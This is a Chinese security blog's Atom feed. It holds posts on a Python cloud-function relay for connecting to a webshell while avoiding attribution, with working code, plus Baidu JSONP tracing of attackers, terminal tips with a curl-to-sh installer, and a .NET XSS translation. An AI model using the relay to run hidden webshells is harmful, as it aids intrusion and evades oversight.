<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M09ic&#39;s Blog</title>
  
  <subtitle>独自行走于莽荒之地</subtitle>
  <link href="https://m09ic.top/atom.xml" rel="self"/>
  
  <link href="https://m09ic.top/"/>
  <updated>2021-03-10T05:07:04.538Z</updated>
  <id>https://m09ic.top/</id>
  
  <author>
    <name>M09ic</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>云函数防溯源webshell的小bug解决方法</title>
    <link href="https://m09ic.top/posts/40492/"/>
    <id>https://m09ic.top/posts/40492/</id>
    <published>2021-03-10T05:07:04.000Z</published>
    <updated>2021-03-10T05:07:04.538Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&mid=2247486271&idx=1&sn=ed73cffeb3731f8a45ef746dff90161b&chksm=9760ffe9a01776ffdb959b1741cccce34f74e12896141f772593736aec5cc3840e1f84471c45&mpshare=1&scene=1&srcid=0301rF8X1He9rFT29lmeVSh1&sharer_sharetime=1615346304928&sharer_shareid=8cae1a717f5186191e21cf4d1aeecd4c&key=a5943a4b6f23903d59781f2e5412576d5344e3ec31866090d70b77a8ab2dd41b5901e4eb2c0e7dcb0a520ec24a661c672cae159041e5ce0662b47d342251537043fd5b71bb92344631fd44ed95d0fb65fcf8de95cfa9d2160762b9f843738c8e2a9b71b924ebfff298c5e30128276e2314a6adae5481972ddcc0643b9a7d1b18&ascene=1&uin=MTIzOTcxMTYwNw==&devicetype=Windows+10+x64&version=6300002f&lang=zh_CN&exportkey=AYahA9caO0uP9CH2GoJAMuw=&pass_ticket=wbsLUunYJ9UV4M+0jul/h/QHd0Fwxlqr0eoEnwSLdzGfkPoysryfbiMrKoNEf7Kh&wx_header=0">论如何防溯源连接WebShell</a></p><p>前两天看到这篇文章,今天在vps上测试了一下,发现蚁剑啥的都连不上.</p><a id="more"></a><p>vps环境是宝塔搭的,nginx+php.</p><p>在web目录下写入一句话.直接访问正常.</p><p>然后照着上述文章的方法复现,发现蚁剑报错.burp抓包发现是404.</p><p>打开云函数后台,发现请求正常.响应正常,只不过是404.</p><p><img src="image-20210310130028568.png" alt="image-20210310130028568"></p><p>这样大概原因就能猜到了. nginx这类反代中间件需要通过匹配HOST转发向对应的负载.</p><p>文章的代码把headers覆盖了,因此requests.post并不能正确的带上HOST.</p><p>因此需要手动添加.</p><p>改好的bug如下.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">from urllib.parse import urlsplit </span><br><span class="line"></span><br><span class="line">def geturl(urlstr):</span><br><span class="line">    jurlstr &#x3D; json.dumps(urlstr)</span><br><span class="line">    dict_url &#x3D; json.loads(jurlstr)</span><br><span class="line">    return dict_url[&#39;u&#39;]</span><br><span class="line"></span><br><span class="line">def main_handler(event, context):</span><br><span class="line">    url &#x3D; geturl(event[&#39;queryString&#39;])</span><br><span class="line">    host &#x3D; urlsplit(url).netloc</span><br><span class="line">    postdata &#x3D; event[&#39;body&#39;]</span><br><span class="line">    headers&#x3D;event[&#39;headers&#39;]</span><br><span class="line">    headers[&quot;HOST&quot;] &#x3D; host</span><br><span class="line">    resp&#x3D;requests.post(url,data&#x3D;postdata,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line">    </span><br><span class="line">    response&#x3D;&#123;</span><br><span class="line">        &quot;isBase64Encoded&quot;: False,</span><br><span class="line">        &quot;statusCode&quot;: 200,</span><br><span class="line">        &quot;headers&quot;: &#123;&#39;Content-Type&#39;: &#39;text&#x2F;html;charset&#x3D;&#39;+resp.apparent_encoding&#125;,</span><br><span class="line">        &quot;body&quot;: resp.text</span><br><span class="line">    &#125;</span><br><span class="line">    return response</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzIxMDYyNTk3Nw==&amp;mid=2247486271&amp;idx=1&amp;sn=ed73cffeb3731f8a45ef746dff90161b&amp;chksm=9760ffe9a01776ffdb959b1741cccce34f74e12896141f772593736aec5cc3840e1f84471c45&amp;mpshare=1&amp;scene=1&amp;srcid=0301rF8X1He9rFT29lmeVSh1&amp;sharer_sharetime=1615346304928&amp;sharer_shareid=8cae1a717f5186191e21cf4d1aeecd4c&amp;key=a5943a4b6f23903d59781f2e5412576d5344e3ec31866090d70b77a8ab2dd41b5901e4eb2c0e7dcb0a520ec24a661c672cae159041e5ce0662b47d342251537043fd5b71bb92344631fd44ed95d0fb65fcf8de95cfa9d2160762b9f843738c8e2a9b71b924ebfff298c5e30128276e2314a6adae5481972ddcc0643b9a7d1b18&amp;ascene=1&amp;uin=MTIzOTcxMTYwNw==&amp;devicetype=Windows+10+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=AYahA9caO0uP9CH2GoJAMuw=&amp;pass_ticket=wbsLUunYJ9UV4M+0jul/h/QHd0Fwxlqr0eoEnwSLdzGfkPoysryfbiMrKoNEf7Kh&amp;wx_header=0&quot;&gt;论如何防溯源连接WebShell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;前两天看到这篇文章,今天在vps上测试了一下,发现蚁剑啥的都连不上.&lt;/p&gt;</summary>
    
    
    
    
    <category term="渗透测试" scheme="https://m09ic.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>有关百度的溯源与反溯源</title>
    <link href="https://m09ic.top/posts/62195/"/>
    <id>https://m09ic.top/posts/62195/</id>
    <published>2020-12-08T08:20:40.000Z</published>
    <updated>2021-01-04T14:50:27.728Z</updated>
    
    <content type="html"><![CDATA[<h2 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h2><p>众所周知,百度有多个臭名昭著的jsonp漏洞长时间不修复,已经被蜜罐利用多年.</p><p>通过百度id溯源攻击者成为了某几个蜜罐厂商防守拿分大头.我也在这上面栽过一次.</p><a id="more"></a><h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><p>互联网发展早期,前端有跨域的刚需但是缺少跨域的解决方案,因此,通过投机取巧的方式封装了script标签的跨域特性.用json</p><p>来交换数据,这种方式成为jsonp.</p><p>因为其投机取巧,因此并不安全.</p><p>cookie在jsonp中没有起到权限验证的作用,反而成为了jsonp的帮凶. 如果攻击者登录了百度,并且访问了蜜罐.蜜罐就可以通过嵌入html的js发起jsonp请求,这个请求因为cookie<strong>同站</strong>的特性,这个jsonp请求会自动带上cookie,获取到敏感信息.</p><p>这个过程和csrf很像,但是更严重,因为jsonp可以获取到返回数据.</p><p>jsonp是一个理应也已经被淘汰的技术.</p><h3 id="百度已知jsonp漏洞"><a href="#百度已知jsonp漏洞" class="headerlink" title="百度已知jsonp漏洞"></a>百度已知jsonp漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mbd.baidu.com&#x2F;newspage&#x2F;api&#x2F;getusername</span><br><span class="line">https:&#x2F;&#x2F;baike.baidu.com&#x2F;api&#x2F;usercenter&#x2F;login</span><br><span class="line">https:&#x2F;&#x2F;passport.baidu.com&#x2F;v2&#x2F;api&#x2F;?ucenteradduname</span><br></pre></td></tr></table></figure><p>上面三个已修复</p><h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>这几个jsonp大多都能拿到百度id.然后通过百度id在搜索引擎搜索别人的历史记录,大多数情况下可以获取找到真实身份.</p><p>需要注意的是,google,百度,搜狗,bing等搜索引擎搜索的结果不相同,结合多个搜索引擎可以搜到许多意想不到的东西.</p><p>搜索引擎对百度知道的收录相对较好.</p><h3 id="百度知道与快照"><a href="#百度知道与快照" class="headerlink" title="百度知道与快照"></a>百度知道与快照</h3><p>可能有些有安全意识的攻击者会删除百度知道的内容,不过刚才也说了,搜索引擎对百度知道的收录较好,因此大多数百度知道的网页都存在快照.只要能找到链接,就算内容别删除了,也可以在快照中看到.</p><h3 id="贴吧高级搜索"><a href="#贴吧高级搜索" class="headerlink" title="贴吧高级搜索"></a>贴吧高级搜索</h3><p>因为贴吧的特性,搜索引擎并不能很好的收录全部信息,而贴吧又是上个时代最热门的社交工具,很多人都在这里发布了有关个人信息的敏感消息.</p><p>更可恶的是,贴吧的设计非常混乱,并且因为刘慈欣事件隐藏了2017年之前的帖子.</p><p>注意!是隐藏,不是删除. 隐藏只是搜索引擎搜不到,但是贴吧自带的高级搜索可以搜到.</p><p><code>https://tieba.baidu.com/f/search/adv</code> </p><p>更更可恶的是,被隐藏的帖子还无法手动删除,并且没有任何举报,申诉的接口.</p><h2 id="反溯源"><a href="#反溯源" class="headerlink" title="反溯源"></a>反溯源</h2><h3 id="隐私设置"><a href="#隐私设置" class="headerlink" title="隐私设置"></a>隐私设置</h3><p>不得不再一次吐槽百度的设计,明明是同一个账号,但是在手机端和web端的隐私设置是独立的.</p><p>贴吧:</p><p>手机端有下面三个选项我觉得比较重要:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">公开地理位置信息</span><br><span class="line">公开我的群组</span><br><span class="line">我关注的吧</span><br></pre></td></tr></table></figure><p>web端 <a href="http://tieba.baidu.com/i/i/profile%E4%B8%AD%E7%9A%84%E9%80%89%E9%A1%B9">http://tieba.baidu.com/i/i/profile中的选项</a></p><p><code>隐藏个人动态</code></p><p>百度知道:</p><p><a href="https://zhidao.baidu.com/ihome/homepage/myaccount?tabpane=followset">https://zhidao.baidu.com/ihome/homepage/myaccount?tabpane=followset</a></p><p>个人页面展示设置</p><p>等等,每个app的web端和手机端都有一些不同的隐私设置,建议都看一遍.</p><p>加强隐私设置只是治标不治本的方法,因为百度的大多数内容都可以被搜索引擎抓取,因此就算设置了隐私,也可以通过搜索引擎搜索.</p><p>根本的解决方法还是删除内容.</p><p>一次性的解决方案是注销百度账号.</p><h3 id="搜索引擎-1"><a href="#搜索引擎-1" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>不管是搜索引擎还是搜索引擎的快照都可以通过举报</p><p>百度: <a href="https://help.baidu.com/webmaster/add">https://help.baidu.com/webmaster/add</a></p><p>google: <a href="https://support.google.com/legal/troubleshooter/1114905?hl=zh-Hans">https://support.google.com/legal/troubleshooter/1114905?hl=zh-Hans</a></p><p>其他搜索引擎也有类似的接口.自行申诉</p><p>还有一种方式,如果删除了某个百度知道提问或者回到,过一段时间搜索引擎会自然从搜索结果中删除.大概在半个月到一个月左右.</p><h3 id="贴吧"><a href="#贴吧" class="headerlink" title="贴吧"></a>贴吧</h3><p>最恶心的是贴吧的内容.</p><p>之前说到了贴吧隐藏了历史帖子,所以无法自行删除.只能抓包修改的方式删除.</p><p>首先通过高级搜索搜索自己历史发言.</p><p>右键检查</p><p><img src="image-20201208161244134-1607415597941.png" alt="image-20201208161244134"></p><p>抓包删除需要三个值,分别是这里的data-tid,data-fid以及pid.</p><p>然后用burp抓一个没被隐藏的帖子的删除包</p><p>替换对应的三个值</p><p><img src="image-20201208161630480.png" alt="image-20201208161630480"></p><p>发包即可,不管成功失败,返回包都是这个,因此只能通过再次搜索确认是否删除成功.</p><p>愿天堂没有百度</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;溯源&quot;&gt;&lt;a href=&quot;#溯源&quot; class=&quot;headerlink&quot; title=&quot;溯源&quot;&gt;&lt;/a&gt;溯源&lt;/h2&gt;&lt;p&gt;众所周知,百度有多个臭名昭著的jsonp漏洞长时间不修复,已经被蜜罐利用多年.&lt;/p&gt;
&lt;p&gt;通过百度id溯源攻击者成为了某几个蜜罐厂商防守拿分大头.我也在这上面栽过一次.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>实用的命令行技巧与花里胡哨的命令行界面</title>
    <link href="https://m09ic.top/posts/36360/"/>
    <id>https://m09ic.top/posts/36360/</id>
    <published>2020-03-23T19:53:05.000Z</published>
    <updated>2021-01-04T14:51:36.693Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>从学计算机开始,每天都在和命令行打交道.从一开始啥都不懂,到处复制别人命令,到现在老是喜欢整写花里胡哨的或者提高效率的东西.</p><p>加上前两天看到了<a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">命令行的艺术</a>这篇文章,正好整理一下这两年折腾过的命令行.</p><a id="more"></a><h2 id="实用的命令行技巧"><a href="#实用的命令行技巧" class="headerlink" title="实用的命令行技巧"></a>实用的命令行技巧</h2><p>因为我自己实在是没有探索出什么实用的技巧,就总结一下命令行的艺术这篇文章中一些最常用的技巧.</p><ol><li><code>sudo !! </code> # 可以给上条命令加上sudo,!!就是代表上一条命令.</li><li>ctrl + r 可以搜索历史记录,并自动键入.当然使用historty|grep something 然后!1150,这样也是同样的效果,不然显然前者更好用.在zsh中更更好用的插件zsh-autosuggestions.</li><li>为了便于编辑长命令，在设置你的默认编辑器后（例如 <code>export EDITOR=vim</code>），<strong>ctrl-x</strong> <strong>ctrl-e</strong> 会打开一个编辑器来编辑当前输入的命令。</li><li>回到前一个工作路径：<code>cd -</code>,在zsh中,cd -然后按tab还可以选择历史工作路径.</li><li>使用 <code>netstat -lntp</code> 或 <code>ss -plat</code> 检查哪些进程在监听端口.</li><li><code>lsof</code> 来查看开启的套接字和文件</li><li>使用tmux来分屏以及挂起.</li><li>用好awd,sed,grep可以免去你写python脚本的时间.</li><li>用好vim,可以免去你从服务器中复制来复制去的时间.</li></ol><p>好了,我在这篇文章中学到的常用的实用技巧就这么些.但是我整花里胡哨的可强了.</p><h2 id="花里胡哨的命令行"><a href="#花里胡哨的命令行" class="headerlink" title="花里胡哨的命令行"></a>花里胡哨的命令行</h2><h3 id="通用配置"><a href="#通用配置" class="headerlink" title="通用配置"></a>通用配置</h3><p>字体: <a href="https://www.jetbrains.com/lp/mono/">https://www.jetbrains.com/lp/mono/</a></p><p>jetbrains家前段时间出品的字体,看着确实挺舒服的.</p><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>先放张成品图</p><p><img src="image-20200324020612679.png" alt="image-20200324020612679"></p><p>去年微软更新了他那个年龄比我还大,丑不拉几的终端.开源了一个新的终端工具—-windows terminal.</p><p>可以把CMD,POWERSHELL,WSL等等各种命令行都聚合起来,用一个配置文件把他们都变得花里胡哨的.</p><p>当然,这个工具现在还在早期测试版本,难免有缺陷与bug.</p><p>来讲讲它的优点吧.</p><ol><li>支持毛玻璃特效以及背景图片.</li><li>它将各种命令行聚合起来,快速打开与切换</li><li>完美支持oh-my-posh(一个类似linux下的oh-my-zsh的工具).</li></ol><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>windows terminal 在windows stores下搜索安装即可.当然也可以从github自己编译安装.</p><p>因为它不会把自己添加到右键菜单,而这个功能还是挺常用的,所以手动改下注册表,把它放进去.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="string">&quot;%USERPROFILE%\AppData\Local\terminal&quot;</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/M09Ic/My_Command_Config/blob/master/wt_32.ico">下载图标</a>,当然可以不要图标,就是丑了点.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\wt]</span><br><span class="line">@&#x3D;&quot;Windows terminal here&quot;</span><br><span class="line">&quot;Icon&quot;&#x3D;&quot;%USERPROFILE%\\AppData\\Local\\terminal\\wt_32.ico&quot;</span><br><span class="line"></span><br><span class="line">[HKEY_CLASSES_ROOT\Directory\Background\shell\wt\command]</span><br><span class="line">@&#x3D;&quot;C:\\Users\\[your_user_name]\\AppData\\Local\\Microsoft\\WindowsApps\\wt.exe&quot;</span><br></pre></td></tr></table></figure><p>这个方法是在<a href="https://www.zhihu.com/question/325948326">知乎的老哥</a>那学来的.</p><h4 id="安装oh-my-posh"><a href="#安装oh-my-posh" class="headerlink" title="安装oh-my-posh"></a>安装oh-my-posh</h4><p><code>Install-Module posh-git -Scope CurrentUser</code></p><p>安装oh-my-posh:</p><p><code>Install-Module oh-my-posh -Scope CurrentUser</code></p><p>导入:</p><p><code>Import-Module oh-my-posh</code></p><p>设置主题,我用的是<code>agnoster</code>:</p><p><code>Set-Theme agnoster</code></p><p>为了让powershell每次启动都能自动加载ohmyposh,得写入配置文件.</p><p><code>$profile</code>查看配置文件</p><p>然后在配置文件中添加:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> $profile</span><br><span class="line">C:\Users\M09ic-xin\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</span><br></pre></td></tr></table></figure><p>上面配置好了,在vscode与pycharm之类的地方同样可以使用.</p><p>这是vscode中的</p><p><img src="image-20200324032853927.png" alt="image-20200324032853927"></p><p>pycharm中的:</p><p><img src="image-20200324033055790.png" alt="image-20200324033055790"></p><p>顺带一提,jetbrains家的ide与vscode都推荐安装<code>Material Theme UI</code>这个主题.</p><p>pycharm下似乎有些bug,不过酷炫就好了,管这么多干什么?</p><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>先上效果图.</p><p><img src="image-20200324032448736.png" alt="image-20200324032448736"></p><p><img src="image-20200324032559909.png" alt="image-20200324032559909"></p><p>分别是kali中的与wt下的wsl中的.</p><p>wsl与linux下安装oh-my-zsh大致相同,只是字体需要额外设置,见下文.</p><h4 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h4><p><code>apt-get install zsh</code></p><h4 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h4><p>如果没有安装git,需要先安装git.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;ohmyzsh&#x2F;ohmyzsh&#x2F;master&#x2F;tools&#x2F;install.sh)&quot;</span><br></pre></td></tr></table></figure><p>如果有多个用户,建议在<code>/etc/passwd</code>下面把每个用户的shell都改成<code>/usr/bin/zsh</code></p><h4 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h4><p>在<code>~/.zshrc</code>中找到<code>ZSH_THEME</code>,引号中的内容改成指定主题.</p><p>推荐使用<code>ys</code>或<code>agnoster</code></p><h4 id="安装字体"><a href="#安装字体" class="headerlink" title="安装字体"></a>安装字体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;powerline&#x2F;fonts.git</span><br><span class="line">cd fonts</span><br><span class="line">.&#x2F;install.sh</span><br></pre></td></tr></table></figure><p>这样安装字体在wsl不适用,wsl依旧需要在windoes terminal里设置字体.</p><h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-syntax-highlighting.git</span><br><span class="line">git clone git:&#x2F;&#x2F;github.com&#x2F;zsh-users&#x2F;zsh-autosuggestions $ZSH_CUSTOM&#x2F;plugins&#x2F;zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>修改<code>~/.zshrc</code>,找到plugins那行，修改成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugins&#x3D;(git z zsh-autosuggestions zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure><p>配合wt的毛玻璃特效,真的太好看了.当然也可以换换口味,加上壁纸之类的.</p><p>因为配色方案并不是zsh控制,而是由终端控制,因此,在vscode,pycharm,wsl,虚拟机中配色各不相同,而且都很好看,新鲜感十足!!!</p><h3 id="其他终端工具"><a href="#其他终端工具" class="headerlink" title="其他终端工具"></a>其他终端工具</h3><h4 id="xshell"><a href="#xshell" class="headerlink" title="xshell"></a>xshell</h4><p>太丑了,又老是更新,被我淘汰了!</p><h4 id="mobaxterm"><a href="#mobaxterm" class="headerlink" title="mobaxterm"></a>mobaxterm</h4><p>在windows下用这个才是正解.</p><p>初始的效果就比黑乎乎的CMD好一万倍.</p><p>![image-20200324033654460.png)</p><p>而且同样可以折腾各种主题,配色.</p><p>比起Xshell来说,功能也更加强大.</p><h4 id="终端配色"><a href="#终端配色" class="headerlink" title="终端配色"></a>终端配色</h4><p><a href="https://github.com/mbadolato/iTerm2-Color-Schemes">https://github.com/mbadolato/iTerm2-Color-Schemes</a></p><h3 id="oh-my-vim"><a href="#oh-my-vim" class="headerlink" title="oh-my-vim"></a>oh-my-vim</h3><p>我就提一下,试用过一次,感觉还不错.但是要这么花的vim为什么不去用ide呢?</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;从学计算机开始,每天都在和命令行打交道.从一开始啥都不懂,到处复制别人命令,到现在老是喜欢整写花里胡哨的或者提高效率的东西.&lt;/p&gt;
&lt;p&gt;加上前两天看到了&lt;a href=&quot;https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md&quot;&gt;命令行的艺术&lt;/a&gt;这篇文章,正好整理一下这两年折腾过的命令行.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>通杀.NET的XSS!(原文翻译以及复现)</title>
    <link href="https://m09ic.top/posts/35797/"/>
    <id>https://m09ic.top/posts/35797/</id>
    <published>2020-03-22T19:21:26.000Z</published>
    <updated>2021-01-04T14:51:09.188Z</updated>
    
    <content type="html"><![CDATA[<p>*(本文首发于先知社区,链接:<a href="https://xz.aliyun.com/t/7453">https://xz.aliyun.com/t/7453</a>)</p><p>原文链接: <a href="https://blog.isec.pl/all-is-xss-that-comes-to-the-net/">All is XSS that comes to the .NET</a></p><p>原作者: Paweł Hałdrzyński</p><p>在<a href="https://portswigger.net/research/top-10-web-hacking-techniques-of-2019">portswigger发布的2019年十大web攻击技术</a>中发现了这篇文章，仔细研究了一番，觉得挺有意思，故尝试翻译。</p><a id="more"></a><p>portswigger对这个技术的评论是:</p><blockquote><p><a href="https://twitter.com/phaldrzynski">Paweł Hałdrzyński</a> takes a <a href="https://blog.isec.pl/all-is-xss-that-comes-to-the-net/">little-known legacy feature</a> of the .NET framework and shows how it can be used to add arbitrary content to URL paths on arbitrary endpoints， causing us some mild panic when we realised even our own website supported it.</p><p>Reminiscent of <a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Relative Path Overwrite</a> attacks， this is a piece of arcana that can sometimes kick off an exploit chain. In the post it’s used for XSS， but we strongly suspect alternative abuses will emerge in future.</p></blockquote><p>第一次翻译文章，如果建议或者有错误请在评论区指出，我会看到一定会回复或修正的。</p><p>(部分语句我按照我自己的理解进行重构，以防止翻译体降低阅读体验，如果有疑问，可以对照原文阅读)</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>在很多框架中,往项目中简便地添加我们自己的资源(如.css和.js)是一个重要的特性.手动插入带有一堆<code>../</code>资源属实恶心.如果使用绝对路径，则会在更改文件或目录结构时仍需要再次花费时间修改资源的路径，而且将应用程序部署到子目录或者更改部署位置的时候，也会使绝对路径失效.幸运的是，对于开发人员，在部署ASP.NET时可以通过与应用程序根目录相对的URL来解决上述问题.更幸运的是，对于攻击人员，这将导致了一些新的方法攻击方法。</p><h3 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h3><p>让我们看一下<code>Control.ResolveUrl</code>方法，该方法可以解析相对于应用程序根目录的路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language&#x3D;&quot;C#&quot; %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;&lt;%&#x3D; ResolveUrl(&quot;~&#x2F;Script.js&quot;) %&gt;&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    .NET version: &lt;%&#x3D;Environment.Version%&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>这段程序会在将<code>~/Script.js</code>这个路径转化为特定路径.如果开发者将Script.js部署在应用的根目录，并在<code>A/B/C/default.aspx</code>文件中用了上面这段代码，当我们访问<code>http://localhost/A/B/C/default.aspx</code>时，会看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;&#x2F;Script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这功能看起来很方便，ASP.NET将~(波浪号)解析为应用程序的根目录，即Script.js的确切位置。就算我们把项目移动到其他位置部署，路径也会跟着更改，使得Script.js依旧可以被访问。</p><p>这个行为似乎很安全，不是吗?那如果我告诉你可以任意修改Script.js的URL地址呢?</p><h3 id="回到以前"><a href="#回到以前" class="headerlink" title="回到以前"></a>回到以前</h3><p>让我们回到那个连浏览器都还不支持Cookie头的灰暗年代，没有Cookie管理用户session似乎是一个问题.然而ASP.NET直接在把session保存在URL中来解决这个问题，正如 <em><a href="https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10)">了解ASP.NETCookie功能如何工作</a></em> 中所述：</p><blockquote><p>在ASP.NET的早起版本(V1.0和V1.1)中， 只有Session State使用了Cookieless这个特性。</p><p>(…)</p><p>在V2.0版本，匿名身份认证和表单认证也使用了这个功能。</p></blockquote><p>随着时间流逝，现在普遍将session存储在Cookie头中.但是，开发人员依旧得处理不支持Cookie的浏览器。ASP.NET 介绍了<a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.configuration.sessionstatesection.cookieless?view=netframework-4.8"><em>SessionStateSection.Cookieless property</em></a> 如何定义和保存session(使用Cookie或在URL中)。</p><p>我们不需要深入了解Cookieless session是怎么运作的，我们只需要知道session ID是如何传递以及如何在URI中表示。</p><p>根据<a href="https://docs.microsoft.com/en-us/previous-versions/ms178581(v=vs.140)">MSDN</a>：</p><blockquote><p>ASP.NET自动将唯一的session ID插入页面的URL中来维护Cookieless会话状态。例如，ASP.NET中通过以下URL保存唯一的session ID lit3py55t21z5v55vlm25s55：<br><code>http://www.example.com/(S(lit3py55t21z5v55vlm25s55))/orderform.aspx</code></p></blockquote><p>URL还可以有一些其他的Cookieless身份标识符(cookieless identifiers):</p><ul><li>(A(?)) - Anonymous ID</li><li>(S(?)) - Session ID</li><li>(F(?)) - Form Authentication Ticket</li></ul><p>对于现代浏览器，<code>SessionStateSection.Cookieless</code>属性的默认值<code>AutoDetect</code>等于将会话ID存储在Cookie头中（而不是将其保存在URL中）。但是，即使强制ASP.NET禁用Cookieless功能(在web.config中将<code>cookieless</code>参数设置为<code>UseCookies</code>也不会导致带<code>cookieless identifiers</code>报错。</p><p>这意义着两种方式访问<code>http://localhost/(A(ABCD))/default.aspx</code>结果是一样的。</p><p>而且，在访问<code>http://localhost/default.aspx</code>的时候，<code>ResolveUrl</code>会将这些标识符解析到URL中。</p><p>让我们快速浏览一下<a href="https://msdn.microsoft.com/en-us/library/system.web.ui.control.resolveurl(v=vs.110).aspx">文档</a>：</p><blockquote><p>如果你的应用程序依赖于Cookieless session或者从需要Cookieless 